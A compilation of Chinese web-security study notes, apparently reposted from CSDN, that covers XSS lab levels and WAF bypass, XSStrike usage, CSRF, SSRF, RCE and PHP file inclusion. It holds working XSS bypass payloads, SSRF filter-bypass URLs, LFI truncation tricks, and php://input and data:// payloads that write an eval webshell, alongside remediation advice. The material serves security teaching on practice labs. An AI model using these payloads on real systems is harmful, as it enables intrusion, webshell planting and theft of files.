<p><img src="https://jinqipiaopiao.github.io//post-images/1634295952392.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634295962066.png" alt="" loading="lazy"></p>
<p>既然此处用了ng-include指令的话，先了解一下其具体的用法。</p>
<pre><code>1、ng-include 指令用于包含外部的 HTML文件。
2、包含的内容将作为指定元素的子节点。
3、ng-include 属性的值可以是一个表达式，返回一个文件名。
4、默认情况下，包含的文件需要包含在同一个域名下。
特别值得注意的几点如下：
1.ng-include,如果单纯指定地址，必须要加引号
2.ng-include,加载外部html，script标签中的内容不执行
3.ng-include,加载外部html中含有style标签样式可以识别
</code></pre>
<p>既然这里可以包含html文件，那么也就可以包含之前有过xss漏洞的源文件<br>
构造代码：</p>
<pre><code>?src='level1.php?name=&lt;img src=1 οnerrοr=alert()&gt;'
</code></pre>
<p><strong>level 16（%0a绕过）</strong><br>
查看代码发现script，/都进行过滤</p>
<figure data-type="image" tabindex="60"><img src="https://jinqipiaopiao.github.io//post-images/1634295969874.png" alt="" loading="lazy"></figure>
<p>采用换行符%0a进行绕过,触发xss。</p>
<pre><code>&lt;a%0atype=&quot;text&quot;%0aonclick=&quot;alert(1)&quot;&gt;
</code></pre>
<p><strong>level 17（闭合标签绕过）</strong></p>
<figure data-type="image" tabindex="61"><img src="https://jinqipiaopiao.github.io//post-images/1634295975129.png" alt="" loading="lazy"></figure>
<p>闭合<code>&lt;embed&gt;</code>即可</p>
<pre><code>level17.php?arg01&amp;arg02=&quot;&gt; onmouseover=alert()
</code></pre>
<p><strong>level 18（闭合标签绕过）</strong><br>
<strong>跟less 19一致，只是多了一个注入点通过闭合<embed>即可</strong></p>
<pre><code>level17.php?arg01&amp;arg02=&quot;&gt; οnmοuseοver=alert()
</code></pre>
<p>————————————————<br>
版权声明：本文为CSDN博主「硫酸超」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_45441315/article/details/119718207</p>
<h1 id="web漏洞-xss跨站之waf绕过及安全修复">WEB漏洞-XSS跨站之WAF绕过及安全修复</h1>
<p>waf防护演示<br>
靶场：xss-labs</p>
<figure data-type="image" tabindex="62"><img src="https://jinqipiaopiao.github.io//post-images/1634297807412.png" alt="" loading="lazy"></figure>
<p>被安全狗拦截</p>
<figure data-type="image" tabindex="63"><img src="https://jinqipiaopiao.github.io//post-images/1634297811186.png" alt="" loading="lazy"></figure>
<p>分析拦截情况<br>
分析方法：<br>
1、通过去除关键词或关键词的其中些字母判断拦截了什么关键词，如下正常</p>
<figure data-type="image" tabindex="64"><img src="https://jinqipiaopiao.github.io//post-images/1634297815210.png" alt="" loading="lazy"></figure>
<p>2、分析了拦截情况可知也可能是尖括号里面如果有s、o之类的关键词其中的某个或多个字母的话就会拦截，正则表达式</p>
<figure data-type="image" tabindex="65"><img src="https://jinqipiaopiao.github.io//post-images/1634297819429.png" alt="" loading="lazy"></figure>
<p>3、不拦截，但是不管用</p>
<figure data-type="image" tabindex="66"><img src="https://jinqipiaopiao.github.io//post-images/1634297823834.png" alt="" loading="lazy"></figure>
<p>4、正常，并且可以访问</p>
<figure data-type="image" tabindex="67"><img src="https://jinqipiaopiao.github.io//post-images/1634297829100.png" alt="" loading="lazy"></figure>
<p>/结束</p>
<figure data-type="image" tabindex="68"><img src="https://jinqipiaopiao.github.io//post-images/1634297834287.png" alt="" loading="lazy"></figure>
<p>常规WAF绕过思路</p>
<pre><code>标签语法替换
特殊符号干扰
/ #
提交方式更改
垃圾数据溢出
加密解密算法
结合其他漏洞绕过
</code></pre>
<p>XSStrike自动化工具说明<br>
靶场：xss-labs，dvws</p>
<p>各个选项说明</p>
<pre><code>-h, --help 显示帮助信息并退出
-u, --url 目标url
–data post方法的数据
-f, --file 从文件读取payloads
-t, --threads 线程数量
-l, --level 爬取级别
-t, --encode payload采取的编码
–json json格式的数据
–path 指定路径注入
–seeds 从文件加载url
–fuzzer fuzz工具
–update 更新
–timeout 超时时间
–params 寻找参数
–crawl 爬取
–proxy 使用代理
–blind 爬取时盲注
–skip 跳过确认等
–skip-dom 跳过dom检查
–headers 添加headers
-d, --delay 两次请求之间的延迟

-u或--url
添加目标url，单个GET方法
</code></pre>
<figure data-type="image" tabindex="69"><img src="https://jinqipiaopiao.github.io//post-images/1634297841642.png" alt="" loading="lazy"></figure>
<pre><code>?name=&lt;A/+/onmOuSeoVer%0d=%0dconfirm()%0dx&gt;v3dm0s
</code></pre>
<p>挑选其中一个手动注入发现成功绕过</p>
<figure data-type="image" tabindex="70"><img src="https://jinqipiaopiao.github.io//post-images/1634297850192.png" alt="" loading="lazy"></figure>
<p><strong>--data</strong><br>
post方法的数据（多个参数）<br>
python xsstrike.py -u &quot;http://IP地址/vulnerabilities/xss_s/&quot; --data &quot;txtName=test&amp;mtxMessage=This+is+a+test+comment.&amp;btnSign=Sign+Guestbook&quot;</p>
<figure data-type="image" tabindex="71"><img src="https://jinqipiaopiao.github.io//post-images/1634297855814.png" alt="" loading="lazy"></figure>
<p><strong>--seeds</strong><br>
从文件<br>
选项:–seeds 不使用-u选项<br>
python xsstrike.py --seeds urls.txt</p>
<figure data-type="image" tabindex="72"><img src="https://jinqipiaopiao.github.io//post-images/1634297869277.png" alt="" loading="lazy"></figure>
<p><strong>--path</strong></p>
<p>测试url路径组件</p>
<pre><code>想要在URL路径中注入这样的有效负载 http://example.com/search/&lt;payload&gt;
python xsstrike.py -u &quot;http://example.com/search/form/query&quot; --path
</code></pre>
<p><strong>--json</strong><br>
POST数据为json格式</p>
<pre><code>python xsstrike.py -u &quot;http://example.com/search.php&quot; --data '{&quot;q&quot;:&quot;query&quot;}' --json
</code></pre>
<p><strong>--crawl</strong><br>
爬取</p>
<pre><code>python xsstrike.py -u &quot;http://ip地址/vulnerabilities/xss_r&quot; --crawl
</code></pre>
<figure data-type="image" tabindex="73"><img src="https://jinqipiaopiao.github.io//post-images/1634297875762.png" alt="" loading="lazy"></figure>
<p><strong>--level</strong><br>
爬取深度<br>
选项-l或–level 默认为2</p>
<pre><code>python xsstrike.py -u &quot;http://IP地址/vulnerabilities/&quot; --crawl -l 5
</code></pre>
<figure data-type="image" tabindex="74"><img src="https://jinqipiaopiao.github.io//post-images/1634297880885.png" alt="" loading="lazy"></figure>
<p><strong>-f或--file</strong><br>
从文件读取payloads</p>
<pre><code>python xsstrike.py -u &quot;http://ip地址/vulnerabilities/xss_r?name=''&quot; -f payloads.txt
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634297885502.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634297893131.png" alt="" loading="lazy"></p>
<p><strong>--params</strong><br>
查找隐藏参数</p>
<pre><code>python xsstrike.py -u &quot;http://ip地址/vulnerabilities/xss_r&quot; --params
</code></pre>
<figure data-type="image" tabindex="75"><img src="https://jinqipiaopiao.github.io//post-images/1634297897389.png" alt="" loading="lazy"></figure>
<p><strong>--fazzer</strong></p>
<figure data-type="image" tabindex="76"><img src="https://jinqipiaopiao.github.io//post-images/1634297901148.png" alt="" loading="lazy"></figure>
<p><strong>Fuzz下XSS绕过WAF</strong><br>
靶场：xss-labs<br>
使用：fuzz模糊搜索</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634297906542.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634297911823.png" alt="" loading="lazy"></p>
<p>安全修复方案<br>
开启httponly<br>
https://www.yisu.com/zixun/310495.html</p>
<p>输入过滤<br>
对输入进行过滤，不允许可能导致XSS攻击的字符输入</p>
<p>输出转义<br>
根据输出点的位置对输出到前端的内容进行适当转义</p>
<p>————————————————<br>
版权声明：本文为CSDN博主「硫酸超」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_45441315/article/details/119747063</p>
<h1 id="csrf及ssrf漏洞案例讲解">CSRF及SSRF漏洞案例讲解</h1>
<figure data-type="image" tabindex="77"><img src="https://jinqipiaopiao.github.io//post-images/1634298208868.png" alt="" loading="lazy"></figure>
<p>CSRF漏洞解释，原理<br>
CSRF(Cross-site request forgery)<br>
跨站请求伪造，由客户端发起，是一种劫持受信任用户向服务器发送非预期请求的攻击方式，与XSS相似，但比XSS更难防范，常与XSS一起配合攻击</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634298213135.png" alt="" loading="lazy"><br>
<strong>原理详解</strong></p>
<p>攻击者盗用了你的身份信息，以你的名义发送恶意请求，对服务器来说这个请求是你发起的，却完成了攻击者所期望的一个操作<br>
XSS 利用站点内内的信任用户，盗取cookie<br>
CSRF通过伪装成受信任用户请求受信任的网站<br>
利用目标用户的合法身份，以目标的名义执行某些非法参数<br>
利用条件：已经登录系统，用户访问URL	已存在的网站中让用户跳转<br>
CSRF漏洞检测，案例，防御</p>
<p><strong>防御方案</strong><br>
1.当用户发送重要的请求时输入验证码<br>
2.涉及随机TOKEN ---数据包的唯一值<br>
3.检测referer来源，请求时判断请求连接是否为当前管理员正在使用的页面（管理员在编辑文章，黑客发来恶意的修改密码链接，因为修改密码页面管理员并没有在操作，所以攻击失败）<br>
4.设置验证码<br>
5.限制请求方式只能为post0<br>
<strong>SSRF（服务器端请求伪造）</strong></p>
<pre><code>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为 
    它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）
SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。 
注释：除了http/https等方式可以造成ssrf，类似tcp connect 方式也可以探测内网一些ip 的端口是否开发服务，只不过危害比较小而已。
</code></pre>
<p><strong>0x01 可能出现的地方</strong></p>
<pre><code>1.社交分享功能：获取超链接的标题等内容进行显示
2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览
3.在线翻译：给网址翻译对应网页的内容
4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片
5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验
6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试
7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作
8.数据库内置功能：数据库的比如mongodb的copyDatabase函数
9.邮件系统：比如接收邮件服务器地址
10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等
11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞
一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……
12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）
</code></pre>
<p><strong>0x02 漏洞验证</strong></p>
<pre><code>1.排除法：浏览器f12查看源代码看是否是在本地进行了请求
比如：该资源地址类型为 http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞
2.dnslog等工具进行测试，看是否被访问
--可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。
3.抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址
--从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址
--通过二级域名暴力猜解工具模糊猜测内网地址
4.直接返回的Banner、title、content等信息
5.留意bool型SSRF
</code></pre>
<p><strong>0x03 利用方式</strong></p>
<pre><code>1.让服务端去访问相应的网址
2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms
3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件
4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）
5.攻击内网应用程序（利用跨协议通信技术）
6.判断内网主机是否存活：方法是访问看是否有端口开放
7.DoS攻击（请求大文件，始终保持连接keep-alive always）
</code></pre>
<p><strong>0x04 绕过小技巧</strong></p>
<pre><code>注：参考[8]会有更详细的绕过方式总结
1.http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的
2.各种IP地址的进制转换
3.URL跳转绕过：http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/
4.短网址绕过 http://t.cn/RwbLKDx
5.xip.io来绕过：http://xxx.192.168.0.1.xip.io/ == 192.168.0.1 (xxx 任意）
指向任意ip的域名：xip.io(37signals开发实现的定制DNS服务)
6.限制了子网段，可以加 :80 端口绕过。http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80
7.探测内网域名，或者将自己的域名解析到内网ip
8.例如 http://10.153.138.81/ts.php , 修复时容易出现的获取host时以/分割来确定host，
但这样可以用 http://abc@10.153.138.81/ 绕过
</code></pre>
<p><strong>0x05 漏洞示例</strong></p>
<pre><code>1.Wordpress3.5.1以下版本 xmlrpc.php pingback的缺陷与ssrf
2.discuz！的ssrf （利用php的header函数来绕过，其实就是302跳转实现协议转换）
3.weblogic的ssrf
</code></pre>
<p><strong>0x06 漏洞修复</strong></p>
<pre><code>1.禁止跳转
2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。
3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题
4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）
5.限制请求的端口为http常用的端口，比如 80、443、8080、8090
6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
</code></pre>
<p><strong>0x07 漏洞利用中牵涉的小技巧</strong></p>
<pre><code>crontab -l 显示当前计划任务
crontab -r 清除当前计划任务
</code></pre>
<p><strong>端口转发工具 socat</strong></p>
<pre><code>在Apache配置文件中写入下面的内容，就可以将jpg文件当做PHP文件来执行
AddType application/x-httpd-php
</code></pre>
<h1 id="三十rce代码及命令执行漏洞全解">三十：RCE代码及命令执行漏洞全解</h1>
<p>摘要：在WEB应用中有时候程序员为了考虑灵活性，简明性，会在代码调用或者命令执行函数去处理。比如当应用在调用一些能将字符串转换为代码的函数时，没有考虑用户是都能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞</p>
<figure data-type="image" tabindex="78"><img src="https://jinqipiaopiao.github.io//post-images/1634364175163.png" alt="" loading="lazy"></figure>
<p><strong>函数eval:</strong></p>
<p>eval() 函数把字符串按照 PHP 代码来计算。<br>
该字符串必须是合法的 PHP 代码，且必须以分号结尾。<br>
如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval() 函数返回 false。</p>
<p><strong>函数system：</strong><br>
system — 执行外部程序，并且显示输出</p>
<pre><code>$code=$_GET['x'];
echo system($code)         //x=ipconfig   x=ver
</code></pre>
<p><strong>漏洞形成条件：</strong></p>
<p>可控变量，以及漏洞函数  无拓展功能，一般没有此类函数<br>
<strong>文件包含漏洞：</strong><br>
本地文件包含和远程文件包含漏洞，自己的服务器允许别人的php代码，实现远程文件包含</p>
<pre><code>index.php
&lt;?php
$file = $_GET['file'];
if(isset($file)){
	include(&quot;$file&quot;);
	//   require();
	//   require_once();
	//   include_once();
}else{
	echo &quot;file fail&quot;;
}
同文件目录下存在其他文件会读取，目录下存在index.php，默认访问index.php，    127.0.0.1/include/?file=dudu.php
../../etc/httpd.conf  本地包含漏洞可以读取其他文件           172.0.0.1/uploads/include.php?file=图片马的地址
有文件包含，直接上传，或者日志进行上传。蚁剑连马时候，连得是目标马的地址
</code></pre>
<p>**PHP中造成文件包含的四个函数 **<br>
<strong>1、include(),require()</strong></p>
<p>当使用include()函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。<br>
当使用require()函数包含文件时，只要程序一执行就会立即调用文件，发生错误的时候会输出错误信息，并且终止脚本的运行。</p>
<p><strong>2.include_once()和include()功能相同，区别在当重复调用同一文件时。程序只调用一次</strong></p>
<p>require_once()功能和require()相同，区别在于当重复调用同一文件时，程序只调用一次。</p>
<p>当上述的四个函数包含一个新文件时，该文件将作为PHP代码执行，php内核并不在意该被包含的文件是什么类型，如果被包含的是txt文件，图片文件，远程URL，也都将作为PHP代码执行</p>
<figure data-type="image" tabindex="79"><img src="https://jinqipiaopiao.github.io//post-images/1634364181179.png" alt="" loading="lazy"></figure>
<p><strong>本地文件包含，远程文件包含的区别</strong></p>
<p><strong>1、本地文件包含LFI（local File Include）</strong><br>
<strong>2.远程文件包含RFI（Remote File Include）需要ini中allow_url_include = on,allow_url_fopen = on</strong></p>
<figure data-type="image" tabindex="80"><img src="https://jinqipiaopiao.github.io//post-images/1634364184648.png" alt="" loading="lazy"></figure>
<p><strong>PHP伪协议</strong></p>
<pre><code>事实就是支持的协议和封装的协议12种
file:// - 访问本地文件系统
http:// - 访问http网站
ftp:// - 访问FTP（s）URLS
php:// - 访问各个输入输出流
zlib:// - 压缩流
data：// - 数据（RFC 2397）
glob：// -查找匹配的文件路径模型
ssh2：// - Secure Shell 2
rar:// - RAR
ogg:// - 音频流
expect:// - 处理交互式的流
        
目标文件  robots.txt	 路径为127.0.0.1/www/robots.txt  	 &lt;?php phpinfo();?&gt;
robots.zip	127.0.0.1/www/robots.zip	robots.txt
1.php	127.0.0.1/www/1.php	&lt;?php echo('Hello world')?&gt;
flag.txt	D:/flag.txt	flag{123test}
</code></pre>
<p><strong>常用协议：</strong><br>
<strong>1.目录遍历获取flag：</strong></p>
<figure data-type="image" tabindex="81"><img src="https://jinqipiaopiao.github.io//post-images/1634364189695.png" alt="" loading="lazy"></figure>
<p><strong>2.php://input                              php://filter</strong></p>
<p><strong>(1) php://input用于执行php代码</strong></p>
<figure data-type="image" tabindex="82"><img src="https://jinqipiaopiao.github.io//post-images/1634364193742.png" alt="" loading="lazy"></figure>
<p><strong>也可以写入shell获取服务器权限</strong></p>
<pre><code>&lt;?php fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[CMD])?&gt;');?&gt;
</code></pre>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634364197993.png" alt="" loading="lazy"><br>
<strong>（2）php://filter 用于读取源码</strong></p>
<pre><code>?file=php://filter/convert.base64-encode/resource=1.php
</code></pre>
<figure data-type="image" tabindex="83"><img src="https://jinqipiaopiao.github.io//post-images/1634364202433.png" alt="" loading="lazy"></figure>
<p>**    3.file://**</p>
<p>用于读取本地系统文件，在CTF中读取本地文件</p>
<figure data-type="image" tabindex="84"><img src="https://jinqipiaopiao.github.io//post-images/1634364206764.png" alt="" loading="lazy"></figure>
<p>**4.data:// **</p>
<pre><code>可以写入后门，获取权限执行任意命令
</code></pre>
<figure data-type="image" tabindex="85"><img src="https://jinqipiaopiao.github.io//post-images/1634364211365.png" alt="" loading="lazy"></figure>
<p><strong>5.zip://</strong></p>
<pre><code>zip://[压缩文件的绝对路径]#[压缩文件的子文件名]
</code></pre>
<figure data-type="image" tabindex="86"><img src="https://jinqipiaopiao.github.io//post-images/1634364215617.png" alt="" loading="lazy"></figure>
<p><strong>6.phar协议</strong></p>
<p>的作用是归档，将多个文件分组为一个文件。可以处理tar和zip文件</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634364220770.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634364225174.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634364230531.png" alt="" loading="lazy"></p>
<h1 id="web漏洞-文件操作之文件包含漏洞全解">WEB漏洞-文件操作之文件包含漏洞全解</h1>
<figure data-type="image" tabindex="87"><img src="https://jinqipiaopiao.github.io//post-images/1634364635259.png" alt="" loading="lazy"></figure>
<p>#文件包含漏洞<br>
原理，检测，类型，利用，修复等</p>
<p>#文件包含各个脚本代码<br>
ASP，PHP，JSP，ASPX等</p>
<pre><code>&lt;!--#include file=&quot;1.asp&quot; --&gt;
&lt;!--#include file=&quot;top.aspx&quot; --&gt;
&lt;c:import url=&quot;http://thief.one/1.jsp&quot;&gt;
&lt;jsp:include page=&quot;head.jsp&quot;/&gt;
&lt;%@ include file=&quot;head.jsp&quot;%&gt;
&lt;?php Include('test.php')?&gt;
</code></pre>
<p>#本地包含-无限制，有限制</p>
<pre><code>http://127.0.0.1:8080/include.php?filename=1.txt
http://127.0.0.1:8000/include.php?filename=../../../www.txt
%00截断：条件：magic_quotes_gpc=Off php版本&lt;5.3.4
filename=../../../www.txt%00
推荐方法：长度阶段：条件：windows，点号需要长于256；linux长于4096 
(例如：windows:1.txt/././././././././././././././././././././././././././././././././././././././././././././
            linux：                 1.txt............................................................................................................................)
</code></pre>
<p>#远程包含-无限制，有限制 PHP Core ：allow_url_include：on on</p>
<pre><code>http://127.0.0.1:8080/iclude.php?filename=http://www.xiaodi8.com/readme.txt
http://127.0.0.1:8080/include.php?filename=http://www.xiaodi8.com/readme.txt%20
http://127.0.0.1:8080/include.php?filename=http://www.xiaodi8.com/readme.txt%23
http://127.0.0.1:8080/include.php?filename=http://www.xiaodi8.com/readme.txt?
</code></pre>
<p>#何种协议流玩法</p>
<pre><code>https://www.cnblogs.com/endust/p/11804767.html
http://127.0.0.1:8080/include.php?filename=php://filter/convert.base64-encode/resource=1.txt
http://127.0.0.1:8080/include.php?filename=php://input POST:&lt;?php system('ver')?&gt;
&lt;?php fputs(fopen('s.php'，'w'),'&lt;?php @eval($_POST[cmd])?&gt;';?&gt;
http://127.0.0.1:8000/include.php?filename=file:///D:/phpstudy/PHPTutorial/www/1.txt
http://127.0.0.1:8080/include.php?filename=data://text/plain,&lt;?php%20phpinfo();?&gt;
</code></pre>
<figure data-type="image" tabindex="88"><img src="https://jinqipiaopiao.github.io//post-images/1634364645209.png" alt="" loading="lazy"></figure>
<h1 id="第30天rec代码及命令执行代码全解">第30天—REC代码及命令执行代码全解</h1>
<p>​ 在Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634365256094.png" alt="" loading="lazy"></p>
<p><strong>代码执行</strong><br>
代码执行的危害<br>
执行脚本代码 脚本能干嘛 它就能干嘛</p>
<p><strong>案例（PHP环境）</strong><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634365259502.png" alt="" loading="lazy"></p>
<p>假设对方存在这样的一个代码执行漏洞 就可以用代码去攻击它</p>
<p>通过evel去上传一个webshell，然后去控制它</p>
<pre><code>&lt;?php
$myfile = fopen(&quot;newfile.txt&quot;, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);
$txt = &quot;Bill Gates\n&quot;;
fwrite($myfile, $txt);
$txt = &quot;Steve Jobs\n&quot;;
fwrite($myfile, $txt);
fclose($myfile);
?&gt;
</code></pre>
<p>当evel换成system后，就能够执行系统命令，而操作命令取决于操作系统</p>
<figure data-type="image" tabindex="89"><img src="https://jinqipiaopiao.github.io//post-images/1634365263725.png" alt="" loading="lazy"></figure>
<p>执行系统命令（当前系统为windows）</p>
<figure data-type="image" tabindex="90"><img src="https://jinqipiaopiao.github.io//post-images/1634365267387.png" alt="" loading="lazy"></figure>
<p><strong>漏洞形成条件</strong></p>
<p><strong>代码层面</strong><br>
可控变量</p>
<p>通过参数值改变值</p>
<p>漏洞函数</p>
<p>使用的那一个函数对变量进行操作，例如evel()与system() ，他们产生的漏洞一个是代码执行，一个是系统命令</p>
<p><strong>漏洞检测</strong></p>
<p><strong>白盒测试</strong><br>
代码审计<br>
<strong>黑盒测试</strong><br>
扫描工具</p>
<p>公开漏洞</p>
<p>手工看参数值及功能点</p>
<p>​ 判断他的数据与功能是否相同</p>
<p><strong>案例（墨者靶场）</strong><br>
<strong>墨者靶场黑盒功能点命令执行-应用功能</strong></p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634365273183.png" alt="" loading="lazy"><br>
打开之后 出现界面</p>
<figure data-type="image" tabindex="91"><img src="https://jinqipiaopiao.github.io//post-images/1634365277706.png" alt="" loading="lazy"></figure>
<p>当我输入127.0.0.1</p>
<p>出现结果<br>
<img src="https://jinqipiaopiao.github.io//post-images/1634365282717.png" alt="" loading="lazy"></p>
<p>这个网站的功能 类似于系统的ping命令，这个地方就有可能出现命令执行漏洞</p>
<p>当我们知道存在漏洞的可能性之后，有一下几个步骤</p>
<p><strong>分析是什么操作系统</strong></p>
<p>操作系统不一样，系统命令不一样，通过抓包获取操作系统类型</p>
<p><strong>当确定操作系统之后，手工进行测试</strong></p>
<figure data-type="image" tabindex="92"><img src="https://jinqipiaopiao.github.io//post-images/1634365288260.png" alt="" loading="lazy"></figure>
<p><strong>我们开始进行管道服务（一条命令执行多条命令）</strong></p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634365294182.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634365300125.png" alt="" loading="lazy"></p>
<p><strong>利用burp进行抓包</strong></p>
<figure data-type="image" tabindex="93"><img src="https://jinqipiaopiao.github.io//post-images/1634365304731.png" alt="" loading="lazy"></figure>
<p><strong>获取到目录</strong></p>
<figure data-type="image" tabindex="94"><img src="https://jinqipiaopiao.github.io//post-images/1634365308873.png" alt="" loading="lazy"></figure>
<p><strong>读取key文件，获取key</strong></p>
<figure data-type="image" tabindex="95"><img src="https://jinqipiaopiao.github.io//post-images/1634365313193.png" alt="" loading="lazy"></figure>
<p>总结</p>
<p>根据功能去判断它可能存在这样的漏洞</p>
<p><strong>墨者靶场白盒代码及命令执行-代码分析</strong></p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634365320200.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634365326251.png" alt="" loading="lazy"></p>
<p><strong>查看源码</strong></p>
<figure data-type="image" tabindex="96"><img src="https://jinqipiaopiao.github.io//post-images/1634365331264.png" alt="" loading="lazy"></figure>
<p><strong>在网上找一个线上环境，运行一下这个环境即可</strong></p>
<figure data-type="image" tabindex="97"><img src="https://jinqipiaopiao.github.io//post-images/1634365369776.png" alt="" loading="lazy"></figure>
<p><strong>获取key</strong></p>
<figure data-type="image" tabindex="98"><img src="https://jinqipiaopiao.github.io//post-images/1634365374397.png" alt="" loading="lazy"></figure>
<p><strong>墨者靶场黑盒层RCE漏洞检测-公开漏洞</strong></p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1634365393666.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1634365397528.png" alt="" loading="lazy"></p>
<p><strong>Webmin</strong>是目前功能最强大的基于Web的Unix系统管理工具。管理员通过浏览器 访问Webmin的各种管理功能并完成相应的管理动作。</p>
<p><strong>网站搜索webmin漏洞</strong></p>
<figure data-type="image" tabindex="99"><img src="https://jinqipiaopiao.github.io//post-images/1634365401641.png" alt="" loading="lazy"></figure>
<p>复现漏洞即可 https://www.cnblogs.com/whoami101/p/11465877.html</p>
<p><strong>javaweb-Struts2框架类RCE漏洞-漏洞层面</strong><br>
通过响应信息查看情况</p>
<figure data-type="image" tabindex="100"><img src="https://jinqipiaopiao.github.io//post-images/1634365405618.png" alt="" loading="lazy"></figure>
<p><strong>搜索漏洞复现即可</strong></p>
<figure data-type="image" tabindex="101"><img src="https://jinqipiaopiao.github.io//post-images/1634365411799.png" alt="" loading="lazy"></figure>
<p>防御<br>
<strong>敏感函数禁用(php为例)</strong></p>
<pre><code>system 执行外部程序并显示输出
exec 执行一一个外部程序
shell_exec 通过hel环境执行命令，并将完整的输出以字符串的方式返回
passthru 执行外部命令并显示原始输出
pcntl_exec 在当前进程空间执行指定程序
</code></pre>
<p>变量过滤或固定</p>
<p>WAF产品</p>
<p>例)</p>
<pre><code>system 执行外部程序并显示输出

exec 执行一一个外部程序

shell_exec 通过hel环境执行命令，并将完整的输出以字符串的方式返回

passthru 执行外部命令并显示原始输出

pcntl_exec 在当前进程空间执行指定程序

变量过滤或固定

WAF产品
</code></pre>
<p>————————————————<br>
版权声明：本文为CSDN博主「沐叶清风z」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/qq_45750691/article/details/119754114</p>
<h1 id="web-漏洞-文件操作之文件下载读取">WEB 漏洞-文件操作之文件下载读取</h1>
<p>原理：<br>
产生：任意语言代码下载函数<br>
文件下载（一些网站由于业务需求，往往需要提供文件查看或者文件下载功能，当若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞）</p>
<p><strong>文件下载功能</strong>在很多web系统上都会出现，一般我们当点击下载链接，便会向后台发送一个下载请求，一般这个请求会包含一个需要下载的文件名称，后台在收到请求后 会开始执行下载代码，将该文件名对应的文件response给浏览器，从而完成下载。 如果后台在收到请求的文件名后,将其直接拼进下载文件的路径中而不对其进行安全判断的话，则可能会引发不安全的文件下载漏洞。此时如果 攻击者提交的不是一个程序预期的的文件名，而是一个精心构造的路径(比如../../../etc/passwd),则很有可能会直接将该指定的文件下载下来。 从而导致后台敏感信息(密码文件、源代码等)被下载。<br>
所以，在设计文件下载功能时，如果下载的目标文件是由前端传进来的，则一定要对传进来的文件进行安全考虑。</p>
<p><strong>漏洞危害</strong><br>
下载服务器任意文件，如脚本代码，服务及系统配置文件等<br>
可用得到的代码进一步代码审计，得到更多可利用漏洞</p>
<p><strong>利用方式</strong><br>
